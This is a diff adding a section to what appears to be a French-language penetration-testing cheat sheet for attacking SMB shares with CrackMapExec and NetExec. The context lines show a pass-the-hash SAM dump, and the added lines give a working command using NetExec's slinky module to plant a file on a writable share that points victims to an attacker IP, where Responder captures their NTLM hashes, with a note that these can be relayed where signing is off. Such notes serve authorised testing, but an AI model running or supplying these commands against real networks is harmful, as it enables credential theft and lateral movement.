@@ -91,3 +91,15 @@ cme smb -u <USER> -H <HASH> --sam <IP>/<MASK>
 ```
 cme smb <IP>
 ```
+
+### Droit en écriture
+
+Il est possible d'obtenir un hash avec les droits en écriture :&#x20;
+
+```
+# Lancer responder dans le terminal 1
+
+nxc smb <IP> -u <USER> -p <PASS> -M slinky -o <ATTACK-IP> <FAKE-FILE-NAME>
+```
+
+La commande va déposer un fichier sur le partage, si un utilisateur va sur le partage, son hash sera obtenu via `responder`. En combinaison avec l'absence de signature, il est possible de faire du relai.
